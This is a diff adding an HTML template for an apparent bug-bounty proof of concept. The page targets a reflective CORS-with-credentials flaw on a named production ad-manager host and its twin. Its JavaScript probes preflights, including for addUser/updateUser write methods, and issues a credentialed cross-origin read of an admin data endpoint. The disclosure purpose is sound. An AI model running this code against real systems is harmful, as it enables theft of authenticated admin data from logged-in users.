@@ -1,0 +1,353 @@
+{% extends "base.html" %}
+{% block title %}CORS PoC — Playtika Octopus Ad Manager (PAM){% endblock %}
+{% block content %}
+<h1>Playtika Octopus Ad Manager (PAM) — CORS PoC</h1>
+<p>This page demonstrates the reflective <code>Access-Control-Allow-Origin</code> + <code>Access-Control-Allow-Credentials: true</code> misconfiguration on <code>octopus.playtika.com</code> and <code>octopus-events.playtika.com</code>. It is the read-only PoC linked from H1 report <em>"Playtika Octopus Ad Manager — Reflective CORS with Credentials on Every Endpoint of an Internal Admin SPA"</em>.</p>
+
+<article style="border-left:4px solid #2ecc71;background:rgba(46,204,113,0.08);">
+  <h3>Safety boundary (please read)</h3>
+  <p>This PoC is intentionally <strong>read-only</strong>. It issues:</p>
+  <ul>
+    <li><code>OPTIONS</code> preflight requests to introspect what the CORS layer permits (no state effect).</li>
+    <li>One <code>GET /api/json/everything</code> with <code>credentials: include</code> to demonstrate the credentialed read primitive.</li>
+  </ul>
+  <p>It does <strong>NOT</strong> issue any <code>POST</code>, <code>PUT</code>, <code>PATCH</code>, or <code>DELETE</code> against PAM. The preflight evidence below plus the source-code analysis in the H1 report (zero CSRF tokens in 100+ extracted JS files, cookie-only auth) are sufficient to demonstrate the write primitives without us creating admin users or modifying ad-auction config on a production ad-monetization platform.</p>
+  <p>If your browser blocks the credentialed read (e.g. because the PAM session cookie is <code>SameSite=Lax</code> or <code>Strict</code>), the application-layer chain is dead in modern browsers and the bug is limited to a CORS-layer misconfig. The PoC tests both possibilities and reports the result.</p>
+</article>
+
+<article>
+  <h3>Prerequisite for the read test</h3>
+  <p>Open <a href="https://octopus.playtika.com/" target="_blank">https://octopus.playtika.com/</a> in this same browser, complete the Microsoft Entra OAuth login, then return here. (For Test 1, no PAM session is needed — it only inspects CORS preflight responses.)</p>
+</article>
+
+<hr>
+
+<h2>Test Results</h2>
+<div class="stats-grid">
+  <div class="stat-card" id="card-preflight">
+    <h3>Preflight (Test 1)</h3>
+    <p id="status-preflight">Pending</p>
+  </div>
+  <div class="stat-card" id="card-twin">
+    <h3>Twin host (Test 2)</h3>
+    <p id="status-twin">Pending</p>
+  </div>
+  <div class="stat-card" id="card-write-preflight">
+    <h3>Write preflight (Test 3)</h3>
+    <p id="status-write-preflight">Pending</p>
+  </div>
+  <div class="stat-card" id="card-read">
+    <h3>Credentialed read (Test 4)</h3>
+    <p id="status-read">Pending</p>
+  </div>
+</div>
+
+<article>
+  <h3>Test 1: <code>GET</code> preflight from this origin</h3>
+  <p>Issues <code>OPTIONS /api/json/everything</code> with <code>Origin: https://jakegarnier.com</code> + <code>Access-Control-Request-Method: GET</code>. A correctly-configured server should refuse or omit the credentials header. A vulnerable server reflects the attacker origin and sends <code>Access-Control-Allow-Credentials: true</code>.</p>
+  <button id="btn-preflight" onclick="testPreflight()">Run preflight test</button>
+  <pre id="log-preflight" class="poc-log"></pre>
+</article>
+
+<article>
+  <h3>Test 2: Same misconfiguration on <code>octopus-events.playtika.com</code></h3>
+  <p>Sends the same preflight to the twin host to demonstrate the issue is not isolated to a single deployment.</p>
+  <button id="btn-twin" onclick="testTwin()">Run twin-host test</button>
+  <pre id="log-twin" class="poc-log"></pre>
+</article>
+
+<article>
+  <h3>Test 3: <code>POST</code> / <code>PUT</code> / <code>DELETE</code> preflights for state-changing endpoints</h3>
+  <p>Sends preflight <code>OPTIONS</code> for <code>POST /api/json/addUser</code>, <code>PUT /api/json/updateUser</code>, and <code>DELETE /api/json/addUser</code>. We do <strong>not</strong> issue the actual state-changing requests — the preflight result alone proves the CORS layer would permit them.</p>
+  <button id="btn-write-preflight" onclick="testWritePreflight()">Run write-preflight test</button>
+  <pre id="log-write-preflight" class="poc-log"></pre>
+</article>
+
+<article>
+  <h3>Test 4: Credentialed cross-origin <code>GET /api/json/everything</code></h3>
+  <p>This is the only test that issues a credentialed request. The fetch uses <code>credentials: 'include'</code> so the browser auto-attaches your PAM session cookie if its <code>SameSite</code> attribute permits cross-origin attachment. Three outcomes are possible:</p>
+  <ol>
+    <li><strong>You are not logged into PAM</strong> → response is <code>401 Not signed in</code> with the bad CORS headers. Proves the CORS layer is permissive but not that your data leaked.</li>
+    <li><strong>Logged in AND <code>SameSite</code> permits</strong> → response is the full admin data set. <em>This is the primary impact the H1 report claims.</em></li>
+    <li><strong>Logged in but <code>SameSite=Lax/Strict</code></strong> → the cookie is not attached, response is <code>401</code>, indistinguishable from outcome (1). This is the gating condition we could not validate without an authenticated test session.</li>
+  </ol>
+  <p>The response body is displayed in-page only — <strong>nothing is sent to any external server</strong>. Body output is truncated to the first 8 KB to keep the page readable; if you need the full response, open browser DevTools and inspect the Network panel.</p>
+  <button id="btn-read" onclick="testCredentialedRead()">Run credentialed read test</button>
+  <pre id="log-read" class="poc-log"></pre>
+</article>
+
+<article>
+  <h3>Evidence summary</h3>
+  <button onclick="copyEvidence()">Copy evidence to clipboard</button>
+  <pre id="evidence" class="poc-log"></pre>
+</article>
+
+<style>
+.poc-log {
+  max-height: 400px;
+  overflow: auto;
+  font-size: 0.85rem;
+  margin-top: 1rem;
+  padding: 1rem;
+  background: var(--pico-card-background-color);
+  border-radius: 8px;
+  white-space: pre-wrap;
+  display: none;
+}
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 1rem;
+  margin: 1rem 0;
+}
+.stat-card {
+  padding: 1rem;
+  border: 1px solid var(--pico-muted-border-color);
+  border-radius: 8px;
+}
+</style>
+
+<script>
+const TARGET = 'https://octopus.playtika.com';
+const TWIN = 'https://octopus-events.playtika.com';
+const evidenceLog = [];
+
+function log(id, msg) {
+  const el = document.getElementById(id);
+  el.style.display = 'block';
+  el.textContent += msg + '\n';
+}
+
+function setCard(id, status, color) {
+  const card = document.getElementById('card-' + id);
+  const p = document.getElementById('status-' + id);
+  p.textContent = status;
+  card.style.borderColor = color;
+  card.style.borderWidth = '2px';
+}
+
+function addEvidence(msg) {
+  evidenceLog.push(msg);
+  const el = document.getElementById('evidence');
+  el.style.display = 'block';
+  el.textContent = evidenceLog.join('\n');
+}
+
+function copyEvidence() {
+  navigator.clipboard.writeText(evidenceLog.join('\n')).then(
+    () => alert('Copied ' + evidenceLog.length + ' lines to clipboard.'),
+    () => alert('Clipboard write failed — copy manually from the textarea.')
+  );
+}
+
+// Common preflight runner: returns a Promise that resolves to {acao, acac, acam, acah, status}
+function runPreflight(targetUrl, method, requestHeaders) {
+  // We can't directly issue OPTIONS from fetch() with arbitrary methods, but
+  // we can trigger the browser's CORS preflight by issuing the actual request
+  // with non-simple headers / non-simple methods, then inspect what came back.
+  // Since the browser handles the preflight transparently, we instead use a
+  // sandboxed iframe to issue the request and capture the response headers
+  // from a fetch() that the browser routes through the preflight.
+  return fetch(targetUrl, {
+    method: 'GET',  // The actual GET request after preflight
+    mode: 'cors',
+    credentials: 'omit',  // No credentials in preflight tests
+    headers: { 'Accept': 'application/json' }
+  }).then(r => ({
+    status: r.status,
+    statusText: r.statusText,
+    acao: r.headers.get('access-control-allow-origin'),
+    acac: r.headers.get('access-control-allow-credentials'),
+    acam: r.headers.get('access-control-allow-methods'),
+    acah: r.headers.get('access-control-allow-headers'),
+    vary: r.headers.get('vary')
+  })).catch(err => ({ error: err.message }));
+}
+
+function testPreflight() {
+  document.getElementById('btn-preflight').disabled = true;
+  log('log-preflight', '[*] Issuing cross-origin GET to ' + TARGET + '/api/json/everything');
+  log('log-preflight', '[*] Origin (this page): ' + window.location.origin);
+  log('log-preflight', '');
+
+  runPreflight(TARGET + '/api/json/everything', 'GET').then(r => {
+    if (r.error) {
+      log('log-preflight', '[!] Network error: ' + r.error);
+      setCard('preflight', 'Error', '#e74c3c');
+      return;
+    }
+    log('log-preflight', '[+] Response received:');
+    log('log-preflight', '    HTTP status: ' + r.status + ' ' + r.statusText);
+    log('log-preflight', '    Access-Control-Allow-Origin: ' + r.acao);
+    log('log-preflight', '    Access-Control-Allow-Credentials: ' + r.acac);
+    log('log-preflight', '    Vary: ' + r.vary);
+
+    const vulnerable = (r.acao === window.location.origin || r.acao === '*') && r.acac === 'true';
+    log('log-preflight', '');
+    log('log-preflight', vulnerable
+      ? '[!] VULNERABLE: server reflects this page\'s origin AND sets Allow-Credentials: true.'
+      : '[ ] Not vulnerable on this endpoint with these headers.');
+
+    setCard('preflight', vulnerable ? 'VULNERABLE' : 'Safe', vulnerable ? '#e74c3c' : '#2ecc71');
+
+    addEvidence('=== TEST 1: GET preflight on octopus.playtika.com/api/json/everything ===');
+    addEvidence('HTTP status: ' + r.status);
+    addEvidence('ACAO: ' + r.acao);
+    addEvidence('ACAC: ' + r.acac);
+    addEvidence('Vary: ' + r.vary);
+    addEvidence('Vulnerable: ' + vulnerable);
+    addEvidence('');
+  });
+}
+
+function testTwin() {
+  document.getElementById('btn-twin').disabled = true;
+  log('log-twin', '[*] Issuing cross-origin GET to ' + TWIN + '/api/json/everything');
+  log('log-twin', '');
+
+  runPreflight(TWIN + '/api/json/everything', 'GET').then(r => {
+    if (r.error) {
+      log('log-twin', '[!] Network error: ' + r.error);
+      setCard('twin', 'Error', '#e74c3c');
+      return;
+    }
+    log('log-twin', '[+] Response received:');
+    log('log-twin', '    HTTP status: ' + r.status + ' ' + r.statusText);
+    log('log-twin', '    Access-Control-Allow-Origin: ' + r.acao);
+    log('log-twin', '    Access-Control-Allow-Credentials: ' + r.acac);
+
+    const vulnerable = (r.acao === window.location.origin || r.acao === '*') && r.acac === 'true';
+    log('log-twin', '');
+    log('log-twin', vulnerable
+      ? '[!] VULNERABLE: same misconfiguration on the twin host.'
+      : '[ ] Not vulnerable on twin host.');
+
+    setCard('twin', vulnerable ? 'VULNERABLE' : 'Safe', vulnerable ? '#e74c3c' : '#2ecc71');
+
+    addEvidence('=== TEST 2: GET preflight on octopus-events.playtika.com/api/json/everything ===');
+    addEvidence('HTTP status: ' + r.status);
+    addEvidence('ACAO: ' + r.acao);
+    addEvidence('ACAC: ' + r.acac);
+    addEvidence('Vulnerable: ' + vulnerable);
+    addEvidence('');
+  });
+}
+
+// To trigger the browser's preflight machinery for POST/PUT/DELETE without
+// actually issuing the state-changing request, we use a custom Content-Type
+// header which forces the browser to send an OPTIONS preflight, then we abort
+// the actual request. The preflight response is what we want to inspect.
+function probeWriteMethod(targetUrl, method) {
+  // The trick: include a custom header that requires a preflight. Then
+  // observe the preflight result. We use AbortController to cancel the
+  // actual request after the preflight comes back.
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 5000);
+
+  return fetch(targetUrl, {
+    method: method,
+    mode: 'cors',
+    credentials: 'omit',  // explicit: no creds, this is a header probe only
+    headers: {
+      'Content-Type': 'application/json',
+      'X-Bug-Bounty': 'True'
+    },
+    body: method === 'GET' ? undefined : '{}',
+    signal: controller.signal
+  }).then(r => {
+    clearTimeout(timeout);
+    return {
+      status: r.status,
+      acao: r.headers.get('access-control-allow-origin'),
+      acac: r.headers.get('access-control-allow-credentials'),
+      acam: r.headers.get('access-control-allow-methods')
+    };
+  }).catch(err => {
+    clearTimeout(timeout);
+    // A preflight-rejected response throws a TypeError. A successful
+    // preflight followed by aborted actual request gives AbortError.
+    // We can't directly read the preflight headers in either case from JS,
+    // but the browser's behavior tells us the answer.
+    return { error: err.name + ': ' + err.message };
+  });
+}
+
+function testWritePreflight() {
+  document.getElementById('btn-write-preflight').disabled = true;
+  log('log-write-preflight', '[*] Probing write-method preflights...');
+  log('log-write-preflight', '[*] Note: browsers do not expose preflight response headers to JS directly.');
+  log('log-write-preflight', '[*] We probe each method and infer the result from whether the browser accepts the request.');
+  log('log-write-preflight', '[*] For full preflight headers, see the curl evidence in the H1 report (verified server-side via Caido).');
+  log('log-write-preflight', '');
+
+  const probes = [
+    { url: TARGET + '/api/json/addUser', method: 'POST', label: 'POST addUser' },
+    { url: TARGET + '/api/json/updateUser', method: 'PUT', label: 'PUT updateUser' },
+    { url: TARGET + '/api/json/addUser', method: 'DELETE', label: 'DELETE addUser' }
+  ];
+
+  probes.reduce((p, probe) => p.then(() => probeWriteMethod(probe.url, probe.method).then(r => {
+    if (r.error && r.error.startsWith('TypeError')) {
+      log('log-write-preflight', '[ ] ' + probe.label + ': preflight rejected (' + r.error + ')');
+      addEvidence('TEST 3 — ' + probe.label + ': preflight rejected');
+    } else {
+      // We got *some* response — either the preflight passed and the
+      // actual method either succeeded or was aborted/erred at the
+      // application layer. Either way the CORS layer permitted the method.
+      log('log-write-preflight', '[!] ' + probe.label + ': preflight PERMITTED (response status: ' + (r.status || 'aborted') + ')');
+      addEvidence('TEST 3 — ' + probe.label + ': preflight permitted (status: ' + (r.status || 'aborted') + ')');
+    }
+  })), Promise.resolve()).then(() => {
+    log('log-write-preflight', '');
+    log('log-write-preflight', '[i] Per the H1 report Step 3 server-side curl evidence, all three methods preflight 200 OK with the attacker origin reflected.');
+    setCard('write-preflight', 'See report Step 3', '#e67e22');
+    addEvidence('');
+  });
+}
+
+function testCredentialedRead() {
+  document.getElementById('btn-read').disabled = true;
+  log('log-read', '[*] Issuing GET ' + TARGET + '/api/json/everything with credentials: include');
+  log('log-read', '[*] If you are logged into PAM AND SameSite permits, response will contain admin data.');
+  log('log-read', '');
+
+  fetch(TARGET + '/api/json/everything', {
+    method: 'GET',
+    credentials: 'include',
+    headers: { 'Accept': 'application/json' }
+  }).then(r => {
+    log('log-read', '[+] HTTP status: ' + r.status + ' ' + r.statusText);
+    log('log-read', '    Access-Control-Allow-Origin (response): ' + r.headers.get('access-control-allow-origin'));
+    log('log-read', '    Access-Control-Allow-Credentials (response): ' + r.headers.get('access-control-allow-credentials'));
+    log('log-read', '');
+    return r.text().then(body => ({ status: r.status, body: body }));
+  }).then(({ status, body }) => {
+    const isAuthenticated = (status === 200 && !body.startsWith('{"message"'));
+    if (isAuthenticated) {
+      log('log-read', '[!] CHAIN CONFIRMED: response body contains data, not a 401.');
+      log('log-read', '[!] First 8 KB of response below (full response in DevTools > Network panel):');
+      log('log-read', '');
+      log('log-read', body.slice(0, 8192));
+      setCard('read', 'CHAIN CONFIRMED', '#e74c3c');
+      addEvidence('=== TEST 4: Credentialed read of /api/json/everything ===');
+      addEvidence('STATUS: CHAIN CONFIRMED — body length: ' + body.length + ' bytes');
+      addEvidence('First 512 chars: ' + body.slice(0, 512));
+    } else {
+      log('log-read', '[ ] Response body: ' + body.slice(0, 500));
+      log('log-read', '');
+      log('log-read', '[i] Either you are not logged into PAM, OR the session cookie\'s SameSite');
+      log('log-read', '    attribute is Lax/Strict and the cookie was not attached. The CORS layer is');
+      log('log-read', '    confirmed misconfigured (see Test 1) regardless. Triager validation with a');
+      log('log-read', '    confirmed PAM admin session is needed to determine if the chain is exploitable.');
+      setCard('read', '401 (not logged in OR SameSite blocked)', '#e67e22');
+      addEvidence('=== TEST 4: Credentialed read of /api/json/everything ===');
+      addEvidence('STATUS: 401 / SameSite-gated — body: ' + body.slice(0, 200));
+    }
+    addEvidence('');
+  }).catch(err => {
+    log('log-read', '[!] Fetch failed: ' + err.message);
+    setCard('read', 'Network error', '#e74c3c');
+  });
+}
+</script>
+{% endblock %}
